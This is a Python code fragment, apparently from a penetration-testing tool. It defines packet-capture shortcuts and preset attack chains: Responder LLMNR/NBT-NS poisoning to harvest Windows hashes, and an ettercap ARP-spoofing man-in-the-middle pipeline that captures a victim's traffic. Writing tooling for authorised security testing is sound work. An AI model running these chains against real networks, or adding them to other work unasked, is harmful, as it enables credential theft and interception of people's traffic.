    ...
    def get_quick_commands(self):
        return [
            {"name": "Capture Interface Traffic", "description": "Capture all traffic on an interface with tcpdump",
             ...
             "args_template": {"interface": "{{interface}}", "count": 1000, "output_file": "capture.pcap"}},
            {"name": "HTTP Traffic Filter", "description": "Capture only HTTP port 80 traffic",
             "tool": "tcpdump_capture",
             "args_template": {"interface": "{{interface}}", "filter": "port 80"}},
            {"name": "TShark Live Capture", "description": "Wireshark CLI packet capture",
             "tool": "tshark_capture",
             "args_template": {"interface": "{{interface}}", "duration": 60}},
    ...
    def get_preset_attack_chains(self):
        return [
            {"name": "Credential Harvesting Pipeline",
             ...
             "best_for": "Windows networks where LLMNR/NBT-NS is enabled and hashes can be captured passively",
             "tradeoffs": "Modern networks disable LLMNR; responder needs time on a live segment; cracking depends on hash strength",
             "steps": [
                 {"tool": "responder_poison", "args": {"interface": "{{interface}}"}, "description": "Start responder to harvest hashes"},
            ...
            {"name": "Full LAN MITM Pipeline",
             ...
             "best_for": "Capturing plaintext credentials on a switched LAN where you own the network position",
             "tradeoffs": "Very noisy and disruptive; breaks modern encrypted traffic; can take down the victim's link",
             "steps": [
                 {"tool": "ettercap_mitm", "args": {"target1": "TARGET_IP", "target2": "GATEWAY_IP", "method": "arp"}, "description": "ARP spoof the target"},
                 {"tool": "tcpdump_capture", "args": {"interface": "{{interface}}", "output_file": "mitm_capture.pcap"}, "description": "Capture all victim traffic"},
